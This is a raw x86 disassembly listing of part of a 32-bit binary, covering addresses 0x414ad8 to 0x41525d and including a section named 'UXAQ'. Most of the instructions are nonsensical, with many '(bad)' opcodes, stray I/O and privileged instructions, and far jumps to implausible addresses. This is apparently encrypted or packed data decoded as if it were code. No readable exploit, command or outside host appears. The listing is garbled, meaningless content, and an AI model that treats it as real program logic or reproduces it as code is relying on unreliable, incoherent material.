  414ad8:	(bad)  
  414ad9:	(bad)  
  414ada:	jbe    0x414afa
  414adc:	aam    0xf1
  414ade:	enter  0x6d7d,0xe4
  414ae2:	adc    BYTE PTR [ebx+0x1c17685f],bh
  414ae8:	ins    BYTE PTR es:[edi],dx
  414ae9:	cmc    
  414aea:	xor    cl,dl
  414aec:	cs pop ebp
  414aee:	lds    ecx,FWORD PTR [ecx+0x5db6b715]
  414af4:	and    eax,0xa2b0aa9e
  414af9:	xor    eax,0x6eb8fd32
  414afe:	or     ebp,DWORD PTR [ebp+0x17]
  414b01:	cmp    cl,BYTE PTR [eax]
  414b03:	and    BYTE PTR [edi+ebx*8+0x7ee102bc],bh
  414b0a:	ins    DWORD PTR es:[edi],dx
  414b0b:	or     BYTE PTR [edx-0x21dc492c],bh
  414b11:	(bad)  
  414b12:	popa   
  414b13:	mov    eax,0x5db5b8cf
  414b18:	adc    al,0x1d
  414b1a:	jle    0x414a9c
  414b1c:	adc    edi,edx
  414b1e:	lock pop ebx
  414b20:	fstp   st(2)
  414b22:	retf   0x1217
  414b25:	and    eax,DWORD PTR [eax]
  414b27:	loopne 0x414b2c
  414b29:	adc    al,0xb0
  414b2b:	hlt    
  414b2c:	rcl    BYTE PTR [eax-0xaf5e893],1
  414b32:	push   eax
  414b33:	stc    
  414b34:	push   ss
  414b35:	imul   DWORD PTR [edi+ecx*4]
  414b38:	inc    ecx
  414b39:	sbb    DWORD PTR [eax+esi*4+0x2cd91135],esi
  414b40:	aam    0x5e
  414b42:	sbb    DWORD PTR [ebp+esi*1+0x4342b701],esi
  414b49:	sbb    eax,0x7d4321af
  414b4e:	loopne 0x414b16
  414b50:	push   esi
  414b51:	mov    eax,0xcd65074d
  414b56:	fld    QWORD PTR [esi]
  414b58:	leave  
  414b59:	pop    ecx
  414b5a:	xchg   BYTE PTR [eax],dl
  414b5c:	mov    bh,0xad
  414b5e:	or     ebp,DWORD PTR [edi-0x1818206]
  414b64:	push   eax
  414b65:	pusha  
  414b66:	ss cs ins DWORD PTR es:[edi],dx
  414b69:	pop    ebp
  414b6a:	aad    0xfb
  414b6c:	or     BYTE PTR [edx],bl
  414b6e:	push   eax
  414b6f:	lds    edx,FWORD PTR [ebx+0x6d800d24]
  414b75:	imul   ebx,ebx,0xe68f56b6
  414b7b:	and    BYTE PTR [ebx+0x5500df7a],bl
  414b81:	aaa    
  414b82:	call   0xc2b9:0xcb576c85
  414b89:	inc    esi
  414b8a:	imul   ebx,ebx,0x30
  414b8d:	inc    eax
  414b8e:	adc    dl,BYTE PTR [edi]
  414b90:	push   ds
  414b91:	push   ebp
  414b92:	mov    edx,0xdb40b23c
  414b97:	push   cs
  414b98:	jmp    0xd7e9:0x39a73d87
  414b9f:	inc    edx
  414ba0:	mov    ds:0x4575b6e,al
  414ba5:	cmp    BYTE PTR [ebx-0x49],dl
  414ba8:	fimul  DWORD PTR [ebx-0x7b]
  414bab:	push   esi
  414bac:	push   ss
  414bad:	pop    esp
  414bae:	in     al,dx
  414baf:	dec    ebx
  414bb0:	push   ds
  414bb1:	add    eax,0xfe620187
  414bb6:	pusha  
  414bb7:	adc    esi,ecx
  414bb9:	jmp    0x414bed
  414bbb:	mov    eax,ds:0x4a55bcd6
  414bc0:	and    edx,DWORD PTR [ebp+esi*4+0x6a26c05d]
  414bc7:	bound  ecx,QWORD PTR [esp+ebx*4]
  414bca:	sbb    bl,BYTE PTR ds:0xaa1adb95
  414bd0:	cs into 
  414bd2:	sub    bh,ah
  414bd4:	mov    ebx,0x7acd17ab
  414bd9:	(bad)  
  414bda:	mov    ah,BYTE PTR [ebp+0x6768ac6d]
  414be0:	push   eax
  414be1:	rcl    DWORD PTR [ecx+0x53],1
  414be4:	jbe    0x414b89
  414be6:	or     esp,eax
  414be8:	bound  esi,QWORD PTR [edx]
  414bea:	or     eax,0x64d8e7ec
  414bef:	xchg   edx,eax
  414bf0:	pop    es
  414bf1:	inc    ebp
  414bf2:	xchg   edi,eax
  414bf3:	ficom  DWORD PTR [ecx]
  414bf5:	lds    ebx,FWORD PTR [ebx-0x25e0c1e0]
  414bfb:	sbb    BYTE PTR cs:[ebx-0x61],0xaa
  414c00:	lock shl al,1
  414c03:	fistp  DWORD PTR [eax]
  414c05:	ja     0x414c0d
  414c07:	pop    ebp
  414c08:	adc    ah,bl
  414c0a:	sbb    al,0x2c
  414c0d:	cwde   
  414c0e:	mov    DWORD PTR fs:[esi-0x3115f97d],edx
  414c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c16:	in     al,0xd6
  414c18:	pop    ss
  414c19:	xchg   esp,eax
  414c1a:	pop    esp
  414c1b:	ficomp DWORD PTR [edx]
  414c1d:	(bad)
  414c20:	sub    al,0x7e
  414c22:	push   cs
  414c23:	jg     0x414c55
  414c25:	push   ss
  414c26:	mov    cl,0x35
  414c28:	inc    esp
  414c29:	dec    ebp
  414c2a:	popa   
  414c2b:	out    0x79,al
  414c2d:	or     eax,0xdb6c455d
  414c32:	lock xchg ebp,eax
  414c34:	cmp    al,0xc5
  414c36:	les    ebx,FWORD PTR [ecx]
  414c38:	pop    edi
  414c39:	sbb    ecx,DWORD PTR [ebx+0x1b]
  414c3c:	sbb    ecx,esp
  414c3e:	imul   ebp,DWORD PTR [ecx+0x1b],0xffffff8f
  414c42:	dec    edx
  414c43:	adc    cl,BYTE PTR [eax+eax*1-0x26eba524]
  414c4a:	mov    DWORD PTR [edx+0x1c],edi
  414c4d:	or     esp,eax
  414c4f:	mov    dh,0x75
  414c51:	aas    
  414c52:	cld    
  414c53:	imul   edx,DWORD PTR [edx],0x5c
  414c56:	mov    ch,0x4d
  414c58:	sub    eax,DWORD PTR [ecx-0x39527a3a]
  414c5e:	je     0x414c35
  414c60:	mov    ecx,DWORD PTR [edi-0x4bb1a8d5]
  414c66:	ins    DWORD PTR es:[edi],dx
  414c67:	sub    DWORD PTR [edx-0x11],esp
  414c6a:	ins    BYTE PTR es:[edi],dx
  414c6b:	adc    eax,0x6d655cbf
  414c70:	mov    bh,0xad
  414c72:	inc    eax
  414c73:	div    edx
  414c75:	jns    0x414cc7
  414c77:	jmp    0x414c54
  414c79:	(bad)  
  414c7a:	loop   0x414ca5
  414c7c:	bound  ebp,QWORD PTR [ebx+0x17]
  414c7f:	pop    edi
  414c80:	cld    
  414c81:	into   
  414c82:	sbb    al,0xef
  414c84:	push   esp
  414c85:	add    eax,0x55b4b288
  414c8a:	inc    esp
  414c8b:	lods   eax,DWORD PTR ds:[esi]
  414c8c:	push   ebp
  414c8d:	mov    cl,0x54
  414c8f:	pop    ebp
  414c90:	sub    BYTE PTR [ebp-0x4],dl
  414c93:	sbb    al,0xb3
  414c95:	test   DWORD PTR [ebp-0x7889d55a],0x9e5e7041
  414c9f:	lea    edx,[ecx+0x17]
  414ca2:	push   ss
  414ca3:	fisub  DWORD PTR [ebx-0x39]
  414ca6:	jge    0x414c3f
  414ca8:	push   esp
  414ca9:	sub    BYTE PTR [ebx+0x2b],bl
  414cac:	lods   eax,DWORD PTR ds:[esi]
  414cad:	and    DWORD PTR [edx-0x5f09e1f3],ecx
  414cb3:	ret    0xfb9c
  414cb6:	push   ebx
  414cb7:	adc    DWORD PTR [edi],edx
  414cb9:	mov    dh,0xa2
  414cbb:	mov    dh,0x65
  414cbd:	shl    BYTE PTR [esp+ebp*2+0x45adb7c8],1
  414cc4:	pop    ebx
  414cc5:	bound  esi,QWORD PTR [esi-0x610488f9]
  414ccb:	and    edi,ebp
  414ccd:	icebp  
  414cce:	add    bl,al
  414cd0:	outs   dx,BYTE PTR ds:[esi]
  414cd1:	pop    ds
  414cd2:	or     DWORD PTR [ebx],ebp
  414cd4:	mov    bl,0x36
  414cd6:	push   cs
  414cd7:	out    dx,eax
  414cd8:	jle    0x414c5c
  414cda:	ss inc esp
  414cdc:	ins    DWORD PTR es:[edi],dx
  414cdd:	push   esi
  414cde:	jecxz  0x414d2e
  414ce0:	cmp    DWORD PTR [esi+0x54],ecx
  414ce3:	lea    ebp,[ebp-0x1cf3924b]
  414ce9:	ret    
  414cea:	cmc    
  414ceb:	add    DWORD PTR [edi-0x68],edi
  414cee:	es jb  0x414d5f
  414cf1:	dec    ebx
  414cf2:	pop    ebx
  414cf3:	stc    
  414cf4:	(bad)  
  414cf5:	jo     0x414cf7
  414cf7:	sbb    ebp,DWORD PTR [eax+0x2f]
  414cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cfb:	into   
  414cfc:	xor    DWORD PTR [esi],ecx
  414cfe:	mov    dl,0xa
  414d00:	sbb    ecx,ebx
  414d02:	(bad)  
  414d03:	(bad)  
  414d04:	pop    esp
  414d05:	jge    0x414d06
  414d07:	(bad)  
  414d08:	fiadd  DWORD PTR [ebx+0x28bbb484]
  414d0e:	outs   dx,BYTE PTR ds:[esi]
  414d0f:	mov    ch,0x45
  414d11:	mov    edi,0x3417aea9
  414d16:	stos   DWORD PTR es:[edi],eax
  414d17:	lods   al,BYTE PTR ds:[esi]
  414d18:	dec    ebp
  414d19:	add    eax,0x6f8c6d2d
  414d1e:	xchg   ebp,eax
  414d1f:	faddp  st(6),st
  414d21:	push   ebx
  414d22:	(bad)  
  414d23:	outs   dx,BYTE PTR ds:[esi]
  414d24:	mov    ch,0xb6
  414d26:	lds    eax,FWORD PTR [ecx+0x78]
  414d29:	xchg   ecx,eax
  414d2a:	std    
  414d2b:	in     eax,0x69
  414d2d:	xchg   ebp,eax
  414d2e:	enter  0x85d0,0x6
  414d32:	shl    ebx,1
  414d34:	xor    eax,0x4f6f7d6
  414d39:	ins    DWORD PTR es:[edi],dx
  414d3a:	or     ebx,DWORD PTR ds:0xc2880d0d
  414d40:	shl    DWORD PTR [eax-0x4eb27d7f],1
  414d46:	push   edi
  414d47:	jne    0x414d9b
  414d49:	jl     0x414dc0
  414d4b:	push   esp
  414d4c:	push   ss
  414d4d:	fidiv  DWORD PTR [esi-0x55]
  414d50:	adc    dh,BYTE PTR [edx+0x43b9fe33]
  414d56:	or     BYTE PTR [edx],cl
  414d58:	sub    BYTE PTR [eax+edi*4],0xd8
  414d5c:	push   ss
  414d5d:	inc    ebx
  414d5e:	pop    edi
  414d5f:	push   esi
  414d60:	ret    0xb58a
  414d63:	dec    ecx
  414d64:	lods   eax,DWORD PTR ds:[esi]
  414d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d66:	sub    ch,BYTE PTR [esi]
  414d68:	or     eax,0x23b27c0f
  414d6d:	shr    DWORD PTR [eax-0x25],0xb6
  414d71:	lea    edx,[edi]
  414d73:	imul   ebx,DWORD PTR [eax+ebp*2+0x5],0xa8d10f02
  414d7b:	ins    DWORD PTR es:[edi],dx
  414d7c:	test   eax,0xdafc2554
  414d81:	out    0x8c,al
  414d83:	jge    0x414d86
  414d85:	in     eax,0x37
  414d87:	mov    dh,0xa1
  414d89:	add    eax,0xbbc306fb
  414d8e:	add    BYTE PTR [edi-0xe],cl
  414d91:	sbb    dh,BYTE PTR [edi+0x570d2db6]
  414d97:	ror    DWORD PTR ds:[eax],cl
  414d9a:	retf   
  414d9b:	data16 mov bh,0xfc
  414d9e:	push   ss
  414d9f:	push   ss
  414da0:	fisub  DWORD PTR ds:0x357b34bb
  414da6:	push   ss
  414da7:	add    ebx,ebp
  414da9:	out    dx,eax
  414daa:	inc    ebx
  414dab:	sbb    eax,0x7b4d9750
  414db0:	lods   al,BYTE PTR ds:[esi]
  414db1:	or     DWORD PTR [edi-0x25a692b3],edi
  414db7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414db9:	push   cs
  414dba:	enter  0x8a7,0xaf
  414dbe:	js     0x414d9d
  414dc0:	dec    edx
  414dc1:	rol    DWORD PTR [ebp-0x40],1
  414dc4:	cmp    BYTE PTR [edx+0x68e880ac],bl
  414dca:	imul   ebx,esp,0xffffff96
  414dcd:	cmc    
  414dce:	jns    0x414d92
  414dd0:	jnp    0x414e25
  414dd2:	in     eax,dx
  414dd3:	add    al,dh
  414dd5:	outs   dx,BYTE PTR ds:[esi]
  414dd6:	dec    ebx
  414dd7:	dec    ebx
  414dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd9:	ja     0x414d9a
  414ddb:	dec    ebp
  414ddc:	cmc    
  414ddd:	sub    dh,BYTE PTR [ebx+0x150d415a]
  414de3:	ins    BYTE PTR es:[edi],dx
  414de4:	test   al,0x3e
  414de6:	xchg   ebp,eax
  414de7:	lahf   
  414de8:	jge    0x414d90
  414dea:	ins    DWORD PTR es:[edi],dx
  414deb:	sub    eax,0xc52f6c2c
  414df0:	mov    BYTE PTR [esi+0x4f],ch
  414df3:	dec    esi
  414df4:	(bad)  
  414df5:	aad    0x68
  414df7:	jns    0x414db4
  414df9:	mov    ah,0x59
  414dfb:	sti    
  414dfc:	pop    esp
  414dfd:	fmul   QWORD PTR [esi-0x4fff8c5f]
  414e03:	and    BYTE PTR [eax+0x380b5456],al
  414e09:	loope  0x414e4b
  414e0b:	mov    ds:0x95cfb5b0,eax
  414e10:	retf   
  414e11:	inc    eax
  414e12:	repnz loop 0x414deb
  414e15:	repnz lods eax,DWORD PTR ds:[esi]
  414e17:	stos   DWORD PTR es:[edi],eax
  414e18:	es jp  0x414e23
  414e1b:	add    BYTE PTR [eax-0x7f],ah
  414e1e:	cmp    cl,BYTE PTR [ecx]
  414e20:	adc    al,0x2c
  414e22:	je     0x414e35
  414e24:	mov    ebx,0x1cdf8d87
  414e29:	jb     0x414ddd
  414e2b:	int3   
  414e2c:	mov    al,0x2d
  414e2e:	ins    DWORD PTR es:[edi],dx
  414e2f:	sub    al,0x76
  414e31:	aaa    
  414e32:	push   ds
  414e33:	pushf  
  414e34:	inc    ecx
  414e35:	jmp    0xabb80272
  414e3a:	adc    eax,0x76d394b4
  414e3f:	mov    al,ds:0x2b896c32
  414e44:	rcl    BYTE PTR [edi+esi*4],0x2c
  414e48:	call   0x10f60cdf
  414e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e4e:	jbe    0x414eb3
  414e50:	jge    0x414e2d
  414e52:	stc    
  414e53:	out    0x56,eax
  414e55:	dec    edx
  414e56:	ficom  DWORD PTR [ecx+0x54]
  414e59:	dec    ebx
  414e5a:	dec    ecx
  414e5b:	jp     0x414e3a
  414e5d:	shl    al,0xdb
  414e60:	xchg   esi,eax
  414e61:	sbb    ch,BYTE PTR [edx]
  414e63:	mov    DWORD PTR [eax+ebx*4+0x25],0x6d8fd883
  414e6b:	pop    ebp
  414e6c:	shr    BYTE PTR [ebp-0x23],1
  414e6f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414e71:	mov    esi,0xb50b395c
  414e76:	ss pop edx
  414e78:	imul   ebp,DWORD PTR [eax+ebx*2-0x45],0x5d
  414e7d:	(bad)  
  414e7e:	into   
  414e7f:	and    al,0xce
  414e81:	add    eax,0x1171b68
  414e86:	pop    ds
  414e87:	clc    
  414e88:	push   ds
  414e89:	icebp  
  414e8a:	sahf   
  414e8b:	push   ebp
  414e8c:	pop    ebp
  414e8d:	fcomp  DWORD PTR [ebp*2-0x463e8250]
  414e94:	enter  0xb319,0x4a
  414e98:	stos   BYTE PTR es:[edi],al
  414e99:	mov    dh,0x4d
  414e9b:	add    al,0xf7
  414e9d:	sbb    ebp,edi
  414e9f:	push   esi
  414ea0:	push   esi
  414ea1:	inc    eax
  414ea2:	pop    es
  414ea3:	adc    BYTE PTR [ebx-0x1ed24be3],bl
  414ea9:	adc    al,0xa2
  414eab:	jbe    0x414ebd
  414ead:	sar    ah,1
  414eaf:	push   cs
  414eb0:	sub    dl,BYTE PTR [esi-0x4e]
  414eb3:	mov    ch,0x6d
  414eb5:	aaa    
  414eb6:	mov    edx,0xd248a757
  414ebb:	mov    edx,0x6b86bc44
  414ec0:	xchg   edi,eax
  414ec1:	mov    dh,0x76
  414ec3:	mov    eax,ds:0x95782e40
  414ec8:	add    eax,0xf8dd4ed4
  414ecd:	adc    esi,DWORD PTR [ebx+ebp*2+0x6b]
  414ed1:	sbb    esp,DWORD PTR [esi+0x71]
  414ed4:	sub    DWORD PTR [ecx],edx
  414ed6:	fisub  DWORD PTR [esi+0x202ea3a8]
  414edc:	mov    dh,0x1d
  414ede:	mov    ebx,0xeb0802f
  414ee3:	(bad)  
  414ee4:	xor    al,0x41
  414ee6:	fcmovnbe st,st(2)
  414ee8:	sbb    DWORD PTR [ebx],esi
  414eea:	pop    ecx
  414eeb:	or     edx,esp
  414eed:	cdq    
  414eee:	aas    
  414eef:	iret   
  414ef0:	test   DWORD PTR [edx],ebx
  414ef2:	and    ch,BYTE PTR [esi]
  414ef4:	scas   eax,DWORD PTR es:[edi]
  414ef5:	pop    ebp
  414ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef7:	out    dx,eax
  414ef8:	cli    
  414ef9:	imul   ebp,DWORD PTR [eax+0x3df956e8],0x5a
  414f00:	add    al,bl
  414f02:	fiadd  DWORD PTR [eax-0xa]
  414f05:	rcl    esi,0x40
  414f08:	pop    esp
  414f09:	call   0x16a60395
  414f0e:	mov    bl,0xfa
  414f10:	icebp  
  414f11:	inc    edi
  414f12:	pop    ebx
  414f13:	fcmovnb st,st(6)
  414f15:	(bad)  
  414f16:	stos   BYTE PTR es:[edi],al
  414f17:	jb     0x414f84
  414f19:	imul   eax,edx,0x2a16f883
  414f1f:	or     DWORD PTR [eax+0x58cc1b11],ebp
  414f25:	pop    ecx
  414f26:	adc    eax,0x52ed8db6
  414f2b:	sub    DWORD PTR [ebp-0x3d],edx
  414f2e:	(bad)  
  414f2f:	and    eax,0x5be646fc
  414f34:	ret    0xb6c7
  414f37:	std    
  414f38:	mov    ecx,0x84d71bda
  414f3d:	into   
  414f3e:	cmp    ebx,ebx
  414f40:	popa   
  414f41:	mov    dl,0x60
  414f43:	jmp    0x414f6d
  414f45:	loop   0x414ed2
  414f47:	in     eax,0x5a
  414f49:	lods   al,BYTE PTR ds:[esi]
  414f4a:	and    edx,DWORD PTR [ebp+0x2fb60dc]
  414f50:	pusha  
  414f51:	jnp    0x414f94
  414f53:	adc    dl,BYTE PTR [eax+0x1c]
  414f56:	in     eax,dx
  414f57:	mov    ch,ch
  414f59:	(bad)  
  414f5a:	push   esp
  414f5b:	pop    ebx
  414f5c:	inc    edx
  414f5d:	and    al,ah
  414f5f:	je     0x414fc9
  414f61:	push   ebx
  414f62:	pop    edx
  414f63:	sub    BYTE PTR [esi],dl
  414f65:	mov    edx,0x83316be5
  414f6a:	push   esp
  414f6b:	lea    esi,[edi]
  414f6d:	mov    dh,0xa5
  414f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f70:	bound  esi,QWORD PTR [ebp-0x11]
  414f73:	ss sub al,0x38
  414f76:	sub    eax,0xd50d9707
  414f7b:	mov    dl,0x6d
  414f7d:	pop    esp
  414f7e:	cwde   
  414f7f:	stos   BYTE PTR es:[edi],al
  414f80:	push   edx
  414f81:	mov    bh,0xd7
  414f83:	jmp    0x1cea9275
  414f88:	mov    ebp,0xd16a13e9
  414f8d:	mov    WORD PTR ds:0xc58026c0,cs
  414f93:	aam    0xb1
  414f95:	sahf   
  414f96:	repz aam 0x6d
  414f99:	stos   BYTE PTR es:[edi],al
  414f9a:	cs mov ah,0xfb
  414f9d:	push   ebx
  414f9e:	test   eax,0x4984aeae
  414fa3:	std    
  414fa4:	fwait
  414fa5:	add    bl,al
  414fa7:	push   ecx
  414fa8:	jg     0x414fe7
  414faa:	daa    
  414fab:	stc    
  414fac:	fist   WORD PTR ds:0x401746ed
  414fb2:	adc    ebp,esi
  414fb4:	arpl   WORD PTR [ecx-0x4bab4cfa],bx
  414fba:	stos   DWORD PTR es:[edi],eax
  414fbb:	mov    al,ds:0xea60ee4
  414fc0:	imul   esp,DWORD PTR [ebx+0x3f1bd450],0x5f
  414fc7:	stos   DWORD PTR es:[edi],eax
  414fc8:	dec    eax
  414fc9:	adc    BYTE PTR [eax-0x25],ah
  414fcc:	xchg   esi,eax
  414fcd:	ins    DWORD PTR es:[edi],dx
  414fce:	lahf   
  414fcf:	xchg   ebp,eax
  414fd0:	sbb    ebp,esp
  414fd2:	jecxz  0x414f85
  414fd4:	adc    al,0x78
  414fd6:	sbb    ecx,DWORD PTR [ebx]
  414fd8:	pop    ebx
  414fd9:	test   eax,0x6acf1114
  414fde:	rcl    DWORD PTR [eax-0x7c5c8914],cl
  414fe4:	mov    dl,BYTE PTR [esi-0x3f425bb2]
  414fea:	push   esp
  414feb:	dec    ebp
  414fec:	fdiv   DWORD PTR [esi]
  414fee:	dec    edx
  414fef:	(bad)  [ebp-0x38]
  414ff2:	and    ch,BYTE PTR [esi+0x3]
  414ff5:	jbe    0x415020
  414ff7:	or     BYTE PTR [eax+0x585a5c5f],cl
  414ffd:	.byte 0x1d
  414ffe:	repnz hlt 

Disassembly of section UXAQ:

00415000 <UXAQ>:
  415000:	push   es
  415001:	cdq    
  415002:	sti    
  415003:	inc    DWORD PTR [eax+edx*1]
  415006:	inc    eax
  415007:	add    BYTE PTR [edx],cl
  415009:	push   es
  41500a:	push   ebx
  41500b:	je     0x41507f
  41500d:	imul   ebp,DWORD PTR [esi+0x67],0xd3000b58
  415014:	sub    eax,0x41ffb07
  415019:	or     ebx,DWORD PTR [ebx+esi*1]
  41501c:	sub    BYTE PTR [ebx],al
  41501e:	sub    al,0xb6
  415020:	pop    ecx
  415021:	ss dec ebp
  415023:	xor    BYTE PTR [esp+edx*8],ah
  415026:	xor    al,dh
  415028:	or     al,0x31
  41502a:	or     esi,DWORD PTR [edx+0x7ffe661]
  415030:	push   esp
  415031:	dec    edi
  415032:	bound  ebp,QWORD PTR [edx+0x65]
  415035:	arpl   WORD PTR [esp+eiz*2+0x10],si
  415039:	or     al,0x60
  41503b:	mov    dl,0xfd
  41503d:	xchg   edi,eax
  41503e:	inc    DWORD PTR [esi]
  415040:	push   ebx
  415041:	jns    0x4150b6
  415043:	je     0x4150aa
  415045:	ins    DWORD PTR es:[edi],dx
  415046:	jmp    DWORD PTR ds:0x411184
  41504c:	mov    eax,eax
  41504e:	pop    es
  41504f:	or     al,0x20
  415052:	or     DWORD PTR [esp+edi*2],0x78
  415056:	je     0x415078
  415058:	or     DWORD PTR [edx+esi*1],0xffffff98
  41505c:	jo     0x414ff2
  41505e:	or     DWORD PTR [edx+esi*1],0xffffffc8
  415062:	ins    BYTE PTR es:[edi],dx
  415063:	push   0x320c6064
  415068:	enter  0x5c20,0x58
  41506c:	push   esp
  41506d:	xor    cl,al
  41506f:	and    BYTE PTR [ebx-0x37b7b3b0],al
  415075:	and    BYTE PTR [ebx-0x6fbfbbf4],al
  41507b:	and    BYTE PTR [ebx+0x383c320c],al
  415081:	xor    al,0x83
  415083:	or     al,0x32
  415085:	enter  0xa4a8,0xa0
  415089:	xor    BYTE PTR [edx+esi*1],cl
  41508c:	enter  0x2c20,0xb8
  415090:	mov    ah,0x32
  415092:	enter  0x8320,0xb0
  415096:	sub    BYTE PTR [edi+edi*8],ah
  415099:	inc    DWORD PTR [esi-0x3b7cacc1]
  41509f:	mov    esp,0x54210abb
  4150a4:	call   0x44250af
  4150a9:	test   BYTE PTR [esp+0x2c],0x1
  4150ae:	je     0x4150b5
  4150b0:	movzx  ebx,WORD PTR [edx+esi*1-0x38]
  4150b5:	div    esi
  4150b7:	and    al,0x30
  4150b9:	mov    eax,ebx
  4150bb:	sbb    eax,DWORD PTR [ebx+ebx*2-0x3d]
  4150bf:	arpl   WORD PTR [eax],sp
  4150c1:	sbb    al,0xc8
  4150c3:	and    BYTE PTR [ebx+0x1014180c],al
  4150c9:	and    DWORD PTR [ebx+0x80c320c],eax
  4150cf:	add    al,0x9f
  4150d1:	retf   
  4150d2:	jg     0x4150cf
  4150d4:	hlt    
  4150d5:	mov    ebx,0x836e05e0
  4150da:	cmp    eax,DWORD PTR [eax]
  4150dc:	jne    0x415137
  4150de:	push   0x6a0644
  4150e3:	mov    al,0x89
  4150e5:	out    dx,al
  4150e6:	jg     0x415153
  4150e8:	das    
  4150e9:	or     BYTE PTR [ebx+0x716037c],al
  4150ef:	xor    eax,eax
  4150f1:	mov    DWORD PTR [esp],eax
  4150f4:	jmp    0x415146
  4150f6:	mov    edx,DWORD PTR [ecx]
  4150f8:	jg     0x415175
  4150fa:	fucomip st,st(6)
  4150fc:	mov    edx,DWORD PTR ds:0x10892cdc
  415102:	or     esp,DWORD PTR [ebx-0x2f74e4f6]
  415108:	add    edx,edx
  41510a:	mov    ecx,DWORD PTR [edi+edi*8-0x3]
  41510e:	std    
  41510f:	outs   dx,DWORD PTR ds:[esi]
  415110:	push   cs
  415111:	lea    edx,[ecx+edx*8+0x4]
  415115:	mov    DWORD PTR [esp+0x4],edx
  415119:	mov    eax,DWORD PTR [ebx]
  41511b:	or     ecx,DWORD PTR [ecx+0x1389070a]
  415121:	inc    eax
  415122:	cmp    eax,0xffffffde
  415125:	neg    BYTE PTR [edx-0x238a9b05]
  41512b:	mov    eax,DWORD PTR [ebx]
  41512d:	dec    esi
  41512e:	adc    eax,0x7033c03
  415133:	mov    ebx,0x51eb5b2d
  415138:	mov    eax,DWORD PTR [edx]
  41513a:	lds    ecx,FWORD PTR [ecx+ecx*4]
  41513d:	adc    al,BYTE PTR [eax+0x4]
  415140:	retf   
  415141:	mov    edx,0x53b6fdf7
  415146:	push   esi
  415147:	push   cs
  415148:	clc    
  415149:	mov    esi,edx
  41514b:	mov    ebx,eax
  41514d:	jg     0x41513f
  41514f:	xor    BYTE PTR [edi+0x4],bh
  415152:	mov    ebx,0x4597d8d
  415157:	jmp    0x415193
  415159:	mov    eax,DWORD PTR [esi]
  41515b:	dec    edi
  41515c:	inc    edx
  41515d:	add    DWORD PTR [esi+0x4],0x9cfdee09
  415164:	cmp    ecx,DWORD PTR [esp+edx*2]
  415167:	inc    esp
  415168:	push   ebx
  415169:	adc    al,0x24
  41516b:	xchg   ecx,eax
  41516c:	push   esp
  41516d:	mov    edi,0x58ccc6c5
  415172:	add    al,0x1e
  415174:	push   eax
  415175:	ins    DWORD PTR es:[edi],dx
  415176:	imul   esi,DWORD PTR [eax+0x5e5a5901],0xfffffff7
  41517d:	outs   dx,BYTE PTR ds:[esi]
  41517e:	fld    TBYTE PTR [ebx+0x63]
  415181:	pop    ecx
  415182:	adc    cl,BYTE PTR [ecx-0x5cef74d8]
  415188:	xor    DWORD PTR [esi-0x4dc508b5],esi
  41518e:	add    al,0xa4
  415190:	ds or  al,0x4a
  415193:	add    al,0xd9
  415195:	loopne 0x415176
  415197:	mov    cl,0xf6
  415199:	inc    esi
  41519a:	mov    ds:0x578f3306,eax
  41519f:	push   ebp
  4151a0:	aaa    
  4151a1:	fnstenv [esi-0x74090453]
  4151a7:	lock mov edi,esp
  4151aa:	jg     0x415135
  4151ac:	pop    es
  4151ad:	mov    eax,DWORD PTR [edx]
  4151af:	mov    ebx,0x2c433542
  4151b4:	pop    es
  4151b5:	fdivp  st(5),st
  4151b7:	mul    bh
  4151b9:	(bad)  
  4151ba:	jns    0x4151d3
  4151bc:	mov    edx,DWORD PTR [edx-0x6f]
  4151bf:	retf   0x2f8b
  4151c2:	add    ecx,DWORD PTR [ebp-0x72]
  4151c5:	cmp    ecx,eax
  4151c7:	jne    0x4151e1
  4151c9:	in     eax,dx
  4151ca:	fsubr  QWORD PTR [esi-0x29]
  4151cd:	sbb    DWORD PTR [ebp+0x4020d802],edi
  4151d3:	or     BYTE PTR ds:0x7b010c06,ch
  4151d9:	retf   
  4151da:	mov    esi,0x16eb2fbd
  4151df:	add    eax,DWORD PTR [ebx+edi*1]
  4151e2:	shl    BYTE PTR [ebp+0xf],1
  4151e5:	push   ds
  4151e6:	pop    ss
  4151e7:	mov    ds:0x3ffbfbdb,eax
  4151ec:	pop    es
  4151ed:	cmp    esi,DWORD PTR [edi]
  4151ef:	jne    0x41519f
  4151f1:	mov    edx,ebx
  4151f3:	mov    eax,esi
  4151f5:	sbb    bh,BYTE PTR [esp+eax*4-0x40]
  4151f9:	lock mov eax,0xa5677d59
  4151ff:	out    0x5a,al
  415201:	pop    ebp
  415202:	pop    edi
  415203:	lea    esp,[esi]
  415205:	xchg   eax,esi
  415207:	in     al,dx
  415208:	hlt    
  415209:	outs   dx,DWORD PTR ds:[esi]
  41520a:	outs   dx,BYTE PTR ds:[esi]
  41520b:	imul   ecx,ebp,0xffffff86
  41520e:	xor    ch,BYTE PTR [edx-0x49]
  415211:	push   es
  415212:	pop    edi
  415213:	outs   dx,DWORD PTR ds:[esi]
  415214:	jb     0x6fb0c1a0
  41521a:	sbb    eax,0x3e4f8b1f
  41521f:	add    ebx,DWORD PTR [edi+0x15]
  415222:	stc    
  415223:	add    edi,DWORD PTR [edx+0x64]
  415226:	fbstp  TBYTE PTR [edx+0x76]
  415229:	sbb    edi,DWORD PTR [esi-0x21]
  41522c:	jne    0x4151b5
  41522e:	and    DWORD PTR [edi+0x41010e8b],esp
  415234:	or     BYTE PTR [edi],al
  415236:	push   ss
  415237:	sub    DWORD PTR [esi+eax*1],ebp
  41523a:	and    DWORD PTR [ecx-0x39],0xffffffda
  41523e:	ret    0xc78
  415241:	dec    ebx
  415242:	push   esi
  415243:	pop    es
  415244:	sub    bl,0x4d
  415247:	xor    al,0xdd
  415249:	test   BYTE PTR [edi],0x7b
  41524c:	jne    0x415258
  41524e:	sub    bl,ch
  415250:	xor    ecx,DWORD PTR [ebx-0x6aa5fce6]
  415256:	pop    esp
  415257:	fnstsw WORD PTR [esi]
  415259:	out    dx,al
  41525a:	jbe    0x415258
  41525c:	retf   
  41525d:	mov    edi,DWORD PTR [edi+0x2e]
